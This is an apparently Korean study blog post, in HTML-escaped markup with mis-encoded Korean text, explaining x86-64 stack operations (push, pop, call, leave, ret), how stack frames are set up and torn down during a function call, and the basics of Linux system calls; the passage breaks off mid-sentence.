&lt;p&gt;&lt;em&gt;ë¦¬ë²„ì‹± ê³µë¶€í•˜ë©´ì„œ ì´ë¯¸ í–ˆë˜ ê±°ë¼ ì—¬ê¸°ì—ì„œëŠ” ê°„ë‹¨í•˜ê²Œ í•˜ê³  ë„˜ì–´ê°‘ë‹ˆë‹¤.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ìŠ¤íƒ: ìš´ì˜ì²´ì œì˜ í•µì‹¬ ìë£Œêµ¬ì¡°&lt;/li&gt;
  &lt;li&gt;í”„ë¡œì‹œì €: Cì–¸ì–´ì˜ í•¨ìˆ˜ì— ëŒ€ì‘&lt;/li&gt;
  &lt;li&gt;ì‹œìŠ¤í…œ ì½œ: ì‹œìŠ¤í…œ í•´í‚¹ì˜ ê´€ì ì—ì„œ ì •ë§ ì¤‘ìš”í•¨.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-ì–´ì…ˆë¸”ë¦¬-ëª…ë ¹ì–´-pt2&quot;&gt;x86-64 ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ Pt.2&lt;/h2&gt;

&lt;h3 id=&quot;ìŠ¤íƒ&quot;&gt;ìŠ¤íƒ&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;push: ìŠ¤íƒì— ìŒ“ì•„ë„£ê¸°
pop: ìŠ¤íƒì—ì„œ ë¹¼ë‚´ê¸°&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;push val: valì— ë“¤ì–´ìˆëŠ” ê°’ì„ ìŠ¤íƒì˜ ìµœìƒë‹¨ì— ìŒ“ìŒ
      &lt;ul&gt;
        &lt;li&gt;ì´ ë•Œ ì¼ì–´ë‚˜ëŠ” ì—°ì‚°ì„ pseudo-codeë¡œ í‘œí˜„í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```wasm
rsp -= 8 //stack grows from high to low
[rsp] = val
```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pop reg: ìŠ¤íƒ ìµœìƒë‹¨ì˜ ê°’ì„ êº¼ë‚´ì„œ regì— ëŒ€ì…
    &lt;ul&gt;
      &lt;li&gt;ì´ ë•Œ ì¼ì–´ë‚˜ëŠ” ì—°ì‚°ì„ pseudo-codeë¡œ í‘œí˜„í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  rsp += 8 // decrease stack span
  reg = [rsp-8] //pop
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;í”„ë¡œì‹œì €&quot;&gt;í”„ë¡œì‹œì €&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;í”„ë¡œì‹œì €ì˜ í˜¸ì¶œ ë° ë°˜í™˜ê³¼ ê´€ë ¨í•´ì„œëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•œë‹¤.&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;í”„ë¡œì‹œì € ë¶ˆëŸ¬ì„œ ì§„ì…í•˜ê¸°: &lt;strong&gt;call&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;í”„ë¡œì‹œì €ì—ì„œ ë‚˜ê°€ì„œ ì›ë˜ì˜ í•¨ìˆ˜ë¡œ ëŒì•„ì˜¤ê¸°: &lt;strong&gt;return&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;ìŠ¤íƒí”„ë ˆì„ ì •ë¦¬í•˜ê¸°: &lt;strong&gt;leave&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;í”„ë¡œì‹œì €ë¥¼ call í•  ë‹¹ì‹œ, ì›ë˜ì˜ í•¨ìˆ˜ì—ì„œ call ë‹¤ìŒì— ìˆ˜í–‰í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ëª…ë ¹ì–´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— push í•´ë‘” ë’¤, ì½œí–ˆë˜ í”„ë¡œì‹œì €ì˜ ì‹œì‘ìœ¼ë¡œ ripë¥¼ ì´ë™í•˜ê²Œ ë˜ëŠ”ë°, ì´ ë•Œ ìŠ¤íƒì— ì €ì¥ë˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ â€˜Return addressâ€™ë¼ ì¹­í•œë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;call addr: addrì— ìˆëŠ” í”„ë¡œì‹œì € í˜¸ì¶œ
    &lt;ul&gt;
      &lt;li&gt;ì´ ë•Œ ì¼ì–´ë‚˜ëŠ” ì—°ì‚°ì„ pseudo-codeë¡œ í‘œí˜„í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  push return_address // push return address into the stack
  jmp addr
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;leave: ìŠ¤íƒí”„ë ˆì„ ì •ë¦¬í•´ì„œ ì›ë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒí”„ë ˆì„ ë³µêµ¬í•˜ê¸°
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;leave ëª…ë ¹ì–´ì™€ ë™ì¼í•œ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ì˜ ì¡°í•©ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  **mov** rsp, rbp // í˜„ì¬ í•¨ìˆ˜ì—ì„œì˜ ìŠ¤íƒ ë°‘ë°”ë‹¥ì´ ì›ë˜ í•¨ìˆ˜ì—ì„œì˜ ìŠ¤íƒì˜ ê°€ì¥ ê¼­ëŒ€ê¸°ê°€ ëœë‹¤.
               // ì¦‰, í˜„ì¬ ìŠ¤íƒ ê¼­ëŒ€ê¸°: ì›ë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ ê¼­ëŒ€ê¸°ì—ì„œ í•˜ë‚˜ ë” ê°„ ìƒíƒœ.
  						 // ì§€ê¸ˆ rspê°€ ê°€ë¦¬í‚¤ëŠ” ìœ„ì¹˜ì—ëŠ” ì›ë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ ë² ì´ìŠ¤ ì£¼ì†Œê°€ ìˆë‹¤.
  **pop** rbp // ì›ë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ ë¹¼ì„œ rbpì— ë„£ì–´ ì¤€ë‹¤.
  				// ë˜í•œ rspë¥¼ í•˜ë‚˜ ë‚´ë¦¼ìœ¼ë¡œì¨ ì›ë˜ í•¨ìˆ˜ì˜ ìŠ¤íƒ ê¼­ëŒ€ê¸°ì™€ ì¼ì¹˜ì‹œí‚¨ë‹¤.
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;ret: return addressë¡œ ripë¥¼ ìœ„ì¹˜ì‹œí‚¨ë‹¤.
    &lt;ul&gt;
      &lt;li&gt;ret ëª…ë ¹ì–´ì™€ ë™ì¼í•œ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  pop rip // leaveë¥¼ ê±°ì¹œ ì´í›„ rspê°€ ê°€ë¦¬í‚¤ëŠ” ê³³ì—ëŠ” ì½œí–ˆë˜ í”„ë¡œì‹œì €ì˜ ì£¼ì†Œë¡œ ripë¥¼ ì›€ì§ì´ê¸° ì „ì—
  			  // ë„£ì–´ ë‘ì—ˆë˜ ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œê°€ ì €ì¥ë˜ì–´ ìˆë‹¤.
  				// ë”°ë¼ì„œ ë‹¤ìŒì— ìˆ˜í–‰í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ìŠ¤íƒì—ì„œ ë¹¼ì„œ ripì— ë„£ì–´ ì¤Œìœ¼ë¡œì¨
  				// ì›ë˜ì˜ ì½”ë“œ í”Œë¡œìš°ë¥¼ ìˆ˜ë³µí•œë‹¤. 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;í•´ë‹¹ ëª…ë ¹ì–´ê°€ ì‹¤ì œë¡œ í‘ì…˜ì½œê³¼ ë¦¬í„´ ê³¼ì •ì—ì„œ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ ì‹œë‚˜ë¦¬ì˜¤ í˜•ì‹ìœ¼ë¡œ ì„¤ëª…í•´ ë³´ì.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;í•¨ìˆ˜ Aë¥¼ ì‹¤í–‰í•˜ë‹¤ê°€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call function_B&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ë§ë‹¥ëœ¨ë ¸ë‹¤.
    &lt;ol&gt;
      &lt;li&gt;4ì—ì„œ ì‹¤í–‰ë  ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œê°€ ìŠ¤íƒì— push ëœë‹¤.&lt;/li&gt;
      &lt;li&gt;í•¨ìˆ˜ Aì˜ ìŠ¤íƒ í”„ë ˆì„ì„ ìœ ì§€í•˜ê¸° ìœ„í•´ A ìŠ¤íƒ í”„ë ˆì„ì˜ rbpê°€ ìŠ¤íƒì— push ëœë‹¤.&lt;/li&gt;
      &lt;li&gt;ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì„ í• ë‹¹í•´ ì£¼ê¸° ìœ„í•´ rbpë¥¼ rspì˜ ìœ„ì¹˜ë¡œ ì˜®ê¸´ë‹¤.&lt;/li&gt;
      &lt;li&gt;ì•ì—ì„œ ë°°ì› ë“¯, OSëŠ” ìŠ¤íƒ í”„ë ˆì„ì„ í• ë‹¹í•  ë•Œ ì†Œê·œëª¨ë¡œ í• ë‹¹í•œ í›„ ê°€ë³€ì ìœ¼ë¡œ ìš´ì˜í•œë‹¤. ë”°ë¼ì„œ, ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ ê³µê°„ì„ í• ë‹¹í•˜ê¸° ìœ„í•´ rspì—ì„œ 0x30 ì •ë„ë¥¼ ëº€ë‹¤.(í†µìƒì )&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì´ë ‡ê²Œ ìƒˆë¡­ê²Œ í• ë‹¹ëœ ìŠ¤íƒ í”„ë ˆì„ê³¼ ê¸°ì¡´ì˜ Aì˜ ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡°ë¥¼ í™•ì¸í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

        &lt;table&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;========ìƒˆë¡œìš´========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=======ìŠ¤íƒ í”„ë ˆì„======&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=========ê³µê°„=========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;Aì˜ rbp ì£¼ì†Œ&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;A ìƒì—ì„œì˜ ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œ&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;ê¸°ì¡´ì— Aì—ì„œ ì“°ê³  ìˆë˜ ì„ì‹œ ë°ì´í„°ë“¤&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;í•¨ìˆ˜ Bë¥¼ ì‹¤í–‰í•œë‹¤.
    &lt;ol&gt;
      &lt;li&gt;ì•ì—ì„œ ë°°ì› ë“¯, ìŠ¤íƒì—ëŠ” ì§€ì—­ ë³€ìˆ˜ê°€ ì €ì¥ëœë‹¤. ë”°ë¼ì„œ í•¨ìˆ˜ Bì˜ ì§€ì—­ ë³€ìˆ˜ë¥¼ ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì— ì €ì¥í•´ ì¤€ë‹¤.&lt;/li&gt;
      &lt;li&gt;ìŠ¤íƒ í”„ë ˆì„ ìœ„ì—ì„œ ì—¬ëŸ¬ ì—°ì‚°ì„ ìˆ˜í–‰í•œë‹¤. ìŠ¤íƒ í”„ë ˆì„ì€ í•¨ìˆ˜ë³„ë¡œ í• ë‹¹ë˜ë¯€ë¡œ í•´ë‹¹ í•¨ìˆ˜ í•œì •ìœ¼ë¡œë§Œ ìœ íš¨í•  ìˆ˜ ìˆëŠ” ë°ì´í„°ë¥¼ ìŠ¤íƒì— ì €ì¥í•  ê²ƒì´ë‹¤.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;í•¨ìˆ˜ Aë¡œ ë³µê·€í•œë‹¤.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt; ëª…ë ¹ì–´ê°€ ì‹¤í–‰ëœë‹¤. ë”°ë¼ì„œ, rspê°€ rbpì˜ ìœ„ì¹˜ë¡œ ì´ë™í•˜ê³  ìŠ¤íƒì— ìˆë˜ Aì˜ rbp ì£¼ì†Œê°€ pop ë˜ë©´ì„œ rbpê°€ ê¸°ì¡´ì˜ Aì˜ ìŠ¤íƒ í”„ë ˆì„ì˜ rbp ì£¼ì†Œë¥¼ ê°€ì§€ê²Œ ëœë‹¤.
        &lt;ul&gt;
          &lt;li&gt;í•œ ë§ˆë””ë¡œ, Bì˜ ìŠ¤íƒ í”„ë ˆì„ì´ ì •ë¦¬ëœ ì´í›„ Aì˜ ìŠ¤íƒ í”„ë ˆì„ì´ ë³µêµ¬ëœë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;í•¨ìˆ˜ A ìƒì—ì„œì˜ ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•œë‹¤.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; ëª…ë ¹ì–´ê°€ ì‹¤í–‰ëœë‹¤. ë”°ë¼ì„œ, A ìƒì—ì„œì˜ ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œê°€ ripë¡œ ë“¤ì–´ê°„ë‹¤.
        &lt;ul&gt;
          &lt;li&gt;ì´ ì‹œì ì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; ì„ ìˆ˜í–‰í•˜ê¸° ì´ì „ì˜ Aì˜ ìŠ¤íƒ í”„ë ˆì„ ìƒíƒœê°€ ì™„ì „íˆ ë³µêµ¬ëœë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ripê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œë‹¤.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ì‹œìŠ¤í…œ-ì½œ&quot;&gt;ì‹œìŠ¤í…œ ì½œ&lt;/h3&gt;

&lt;p&gt;OSë¥¼ ê³µë¶€í–ˆë‹¤ë©´ ì‰½ê²Œ ì´í•´í•  ìˆ˜ ìˆëŠ” ë‚´ìš©ì´ë‹¤. ì‚¬ì‹¤ OS ì±…ì˜ 1ì¥ 1í˜ì´ì§€ ì •ë„ í¼ì³ë´¤ë‹¤ë©´ ì´í•´í•  ìˆ˜ ìˆëŠ” ë‚´ìš©ì´ë‹¤. ë”°ë¼ì„œ ìì„¸í•œ ë¶€ì—° ì„¤ëª…ì„ ë¶™ì´ì§€ ì•Šê³ , ê°„ë‹¨íˆ ì •ë¦¬ë§Œ í•˜ê³  ë„˜ì–´ê°„ë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;OSëŠ” ì‹œìŠ¤í…œ ë³´í˜¸ë¥¼ ìœ„í•´ ì‹œìŠ¤í…œê³¼ ì§ê²°ëœ í–‰ìœ„(ex: ë„¤íŠ¸ì›Œí¬ í†µì‹ , íŒŒì¼ì‹œìŠ¤í…œ í…Œì´ë¸” ìƒì„±/ì¶”ê°€/ì‚­ì œ, íŒŒì¼ Read/Writeâ€¦)ëŠ” ì‹¤í–‰ ê¶Œí•œì„ ë¶„ë¦¬í•´ì„œ ê´€ë¦¬í•œë‹¤. ì´ëŸ´ ë•Œ ë¶€ì—¬í•˜ëŠ” ê¶Œí•œì´ ë°”ë¡œ ì»¤ë„ ê¶Œí•œê³¼ ìœ ì € ê¶Œí•œì´ë‹¤. ìœ ì € ê¶Œí•œì„ ê°€ì§„ í”„ë¡œì„¸ìŠ¤ë“¤ì€ ì»¤ë„ ê¶Œí•œì´ í•„ìš”í•œ ì‹œìŠ¤í…œ í–‰ìœ„ì— ì§ì ‘ ì—‘ì„¸ìŠ¤í•  ìˆ˜ ì—†ê³ , &lt;strong&gt;OSì—ê²Œ ìš”ì²­í•´&lt;/strong&gt; OSê°€ ëŒ€ì‹  ì»¤ë„ ê¶Œí•œì´ í•„ìš”í•œ ì‹œìŠ¤í…œ í–‰ìœ„ë¥¼ ìˆ˜í–‰í•˜ê³  ê·¸ ê²°ê³¼ë¥¼ ë°›ì•„ë³´ëŠ” ê²ƒì´ ê¸°ë³¸ì´ë‹¤.&lt;/p&gt;

  &lt;p&gt;ì´ë•Œ OSëŠ” ìœ ì € ê¶Œí•œê³¼ ì»¤ë„ ê¶Œí•œì„ ì‚¬ìš©í•˜ëŠ” ìƒíƒœë¥¼ ì˜¤ê°€ëŠ”ë°, ìœ ì € ê¶Œí•œì„ ì‚¬ìš©í•  ë•Œë¥¼ â€˜ìœ ì € ëª¨ë“œâ€™, ì»¤ë„ ê¶Œí•œì„ ì‚¬ìš©í•  ë•Œë¥¼ â€˜ì»¤ë„ ëª¨ë“œâ€™ì— ìˆë‹¤ê³  í‘œí˜„í•œë‹¤.&lt;/p&gt;

  &lt;p&gt;ê°œì¸ì ìœ¼ë¡œ OSëŠ” ì •ë§ ì¬ë¯¸ìˆê³  í¥ë¯¸ë¡œìš´ ë¬¸ì œì™€ í•´ê²°ì˜ ì—°ì†ì´ë¼ê³  ëŠê¼ˆê¸° ë•Œë¬¸ì—, ë§Œì¼ í¥ë¯¸ê°€ ìƒê²¼ë‹¤ë©´ ê³µë¶€í•´ ë³´ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤. ë¦¬ëˆ…ìŠ¤ë¶€í„° ê³µë¶€í•˜ëŠ” ê²Œ ì¢‹ì„ ê²ƒì´ë‹¤. ë©€ì›¨ì–´ ë¶„ì„ì´ ëª©í‘œë¼ë©´ ìœˆë„ìš°ë¥¼ ê³µë¶€í•´ì•¼ í•˜ê² ì§€ë§Œâ€¦&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Q. ê·¸ëŸ¼ í”„ë¡œì„¸ìŠ¤ì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec echo HOSTNAME&lt;/code&gt; ì„ ì‹¤í–‰í•  ë•Œ í”„ë¡œì„¸ìŠ¤ëŠ” ì»¤ë„ ëª¨ë“œë¡œ ì§„ì…í•˜ê²Œ ë˜ëŠ” ê±´ê°€ìš”?&lt;/li&gt;
    &lt;li&gt;A. ì•„ë‹™ë‹ˆë‹¤. OSì˜ êµ¬ì„±ìš”ì†Œê°€ ì•„ë‹Œ ìœ ì € ë ˆë²¨ì—ì„œ ìƒì„±ë˜ê³  ê´€ë¦¬ë˜ëŠ” ìš”ì†Œë“¤ì´ë¼ë©´ ë¬´ì¡°ê±´ ìœ ì € ëª¨ë“œì—ì„œ ë²—ì–´ë‚  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ëŠ” ì»¤ë„ ê¶Œí•œì´ í•„ìš”í•œ í–‰ìœ„ë¥¼ ìˆ˜í–‰í•˜ê³  ì‹¶ì„ ë•Œ &lt;strong&gt;OSì—ê²Œ ìˆ˜í–‰ì„ ìš”ì²­&lt;/strong&gt;í•˜ê³  ê·¸ ê²°ê³¼ë§Œ ë°›ì•„ë³´ê²Œ ë©ë‹ˆë‹¤. ì¦‰ OSê°€ ì»¤ë„ ëª¨ë“œë¡œ ì§„ì…í•˜ê³  ë¹ ì ¸ë‚˜ì˜µë‹ˆë‹¤.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;ì¦‰, OSë¥¼ ì¹¨í•´í•˜ëŠ” í•´í‚¹ì´ ê°€ì¥ ì‹¬ê°í•œ ê²°ê³¼ë¥¼ ì´ëŒì–´ë‚´ëŠ” ê²½ìš°ëŠ” í•´ë‹¹ í•´í‚¹ì´ OSì˜ ì»¤ë„ ëª¨ë“œ ê¶Œí•œì„ ë¹¼ì•—ì•˜ì„ ë•Œ ë°œìƒí•œë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ ì‹œìŠ¤í…œ ì½œ(System Call)ì´ë€ ë¬´ì—‡ì¼ê¹Œ? ìœ„ì— ì„œìˆ í•œ ë‚´ìš© ì¤‘ì— ë‹µì´ ìˆë‹¤â€¦ (ì†Œê³¤ì†Œê³¤)&lt;/p&gt;

&lt;p&gt;êµµì€ ê¸€ì”¨ë¡œ ì“°ì¸ ë‚´ìš©ì„ ë³´ì. ê·¸ë¦¬ê³  ë‹¤ìŒ ì„¤ëª…ì„ ë³´ì. System Callì´ë€ ìœ ì € ëª¨ë“œì—ì„œ ì»¤ë„ ëª¨ë“œì—ì„œì˜ ìˆ˜í–‰ì´ í•„ìš”í•  ë•Œ â€˜ìš”ì²­í•˜ëŠ” ê²ƒâ€™ì´ë‹¤. ì´í•´ê°€ í™• ë  ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì •ë¦¬í•´ì„œ,&lt;/p&gt;

&lt;aside&gt;
âš™ ìœ ì € ëª¨ë“œì˜ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì»¤ë„ ëª¨ë“œì˜ ë™ì‘ì´ í•„ìš”í•˜ë‹¤. â†’ System Callì„ í•œë‹¤. â†’ OSëŠ” í•´ë‹¹ ìš”ì²­ì„ ìŠ¹ì¸í•´ ì»¤ë„ ëª¨ë“œì˜ ë™ì‘ì„ ìˆ˜í–‰í•œë‹¤. â†’ OSëŠ” ìˆ˜í–‰ ê²°ê³¼ë¥¼ ë°˜í™˜í•œë‹¤. â†’ í”„ë¡œì„¸ìŠ¤ëŠ” ë°˜í™˜ë°›ì€ ê²°ê³¼ë¥¼ ì´ìš©í•œë‹¤.

&lt;/aside&gt;

&lt;p&gt;x64 ì•„í‚¤í…ì²˜ì—ì„œëŠ” ì‹œìŠ¤í…œì½œì„ í•˜ê¸° ìœ„í•´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì“´ë‹¤. &lt;del&gt;ë‚˜ë„ í”„ë¡œê·¸ë˜ë° í•˜ë‹¤ê°€ ë³¸ ê²ƒ ê°™ë‹¤â€¦ ì•„ë§ˆë„?&lt;/del&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;ì—¬ê¸°ì—ì„œ ëë‚˜ë©´ ì•ˆëœë‹¤. ì§€ê¸ˆ ì´ í¬ìŠ¤íŠ¸ì˜ ëª©ì ì€ â€˜ì–´ì…ˆë¸”ë¦¬ì–´â€™ë¥¼ ê³µë¶€í•˜ëŠ” ê²ƒì´ì§€ OS ê°œë¡ ì„ ê³µë¶€í•˜ëŠ” ê²Œ ì•„ë‹ˆê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; ëª…ë ¹ì–´ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì‹œìŠ¤í…œ ì½œì€ í•¨ìˆ˜ë‹¤. ì¦‰, ì¸ìê°€ ìˆê³ , í•´ë‹¹ ì¸ìë¥¼ ì´ìš©í•´ ì–´ë– í•œ í–‰ìœ„ë¥¼ í•œë‹¤. ì´ ê²½ìš°ì—ëŠ” ì»¤ë„ì—ê²Œ â€˜ì‚¬ì „ ì •ë³´â€™ë¥¼ ì£¼ë©´ì„œ â€˜ì›í•˜ëŠ” í–‰ìœ„â€™ë¥¼ ìš”ì²­í•˜ëŠ” ê²ƒì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë ‡ê²Œ ì›í•˜ëŠ” í–‰ìœ„ì™€ ì‚¬ì „ ì •ë³´ë¥¼ ì „ë‹¬í•  ë•Œ, ì•„í‚¤í…ì²˜ ë ˆë²¨ë¡œ ë‚´ë ¤ê°€ ë³¸ë‹¤ë©´ ë‹¹ì—°íˆ ë ˆì§€ìŠ¤í„°ê°€ ê°œì…í•  ê²ƒì´ë‹¤. íŒŒë¼ë¯¸í„°ê°€ ìˆëŠ” í‘ì…˜ì½œì´ ìˆ˜í–‰ë˜ëŠ” ê³¼ì •ì„ í•œ ë²ˆ ì–´ì…ˆë¸”ë¦¬ ë””ë²„ê±°ë¡œ ë³´ê²Œ ë˜ë©´ ì§ê´€ì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´ ì–´ë–¤ ë ˆì§€ìŠ¤í„°ê°€ í†µìƒì ìœ¼ë¡œ ê°œì…í• ê¹Œ? ê·¸ë¦¬ê³  ì–´ë–¤ ë ˆì§€ìŠ¤í„°ì— â€˜ì‚¬ì „ ì •ë³´â€™ì™€ â€˜ì›í•˜ëŠ” í–‰ìœ„â€™ê°€ ë“¤ì–´ê°ˆê¹Œ?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ë¦¬ëˆ…ìŠ¤ì˜ ê²½ìš° â€˜ì›í•˜ëŠ” í–‰ìœ„â€™ë¥¼ ê°€ë¦¬í‚¤ëŠ” ë°ì´í„°ëŠ” raxì— ì €ì¥ëœë‹¤.&lt;/strong&gt; í•´ë‹¹ ê°’ì€ ì‹œìŠ¤í…œ ì½œ í…Œì´ë¸”ì´ë¼ëŠ” ì‹œìŠ¤í…œ ì½œì´ ì €ì¥ë˜ì–´ ìˆëŠ” í…Œì´ë¸”ì˜ ì¸ë±ìŠ¤ ë„˜ë²„ì´ë¯€ë¡œ, ì–´ë– í•œ í–‰ìœ„ë¥¼ ì›í•˜ëŠ”ì§€ë¥¼ ì‹œìŠ¤í…œì´ ì¸ì‹í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì–´ë–¤ í–‰ìœ„ë¥¼ ì›í•˜ëŠ”ì§€ ì•Œì•˜ë‹¤ë©´ ê·¸ í–‰ìœ„ì— í•„ìš”í•œ ì¸ìë¥¼ ë°›ì•„ì•¼ í•  ì°¨ë¡€ë‹¤. í•œ ì˜ˆë¡œ, í˜„ì¬ ë©”ëª¨ë¦¬ì— ìˆëŠ” ê°’ì„ ì½ì–´ ì™€ ì½˜ì†”ì— writeí•˜ë ¤ í•œë‹¤ê³  í•˜ì. (writeê°€ í•µì‹¬ì´ë‹¤. í”„ë¡œì„¸ìŠ¤ê°€ ì„ ì–¸í•œ ë°ì´í„°ê°€ ì €ì¥ë˜ì–´ ìˆëŠ” ì˜ì—­ì„ readí•  ë• ìœ ì € ê¶Œí•œìœ¼ë¡œ í•œë‹¤. ì• ì´ˆì— ë©”ëª¨ë¦¬ì—ëŠ” ì»¤ë„ë§Œì„ ìœ„í•œ ì˜ì—­ì´ ë”°ë¡œ ìˆì–´ì„œ ì—„ê²©í•˜ê²Œ ì»¤ë„ê³¼ ìœ ì € 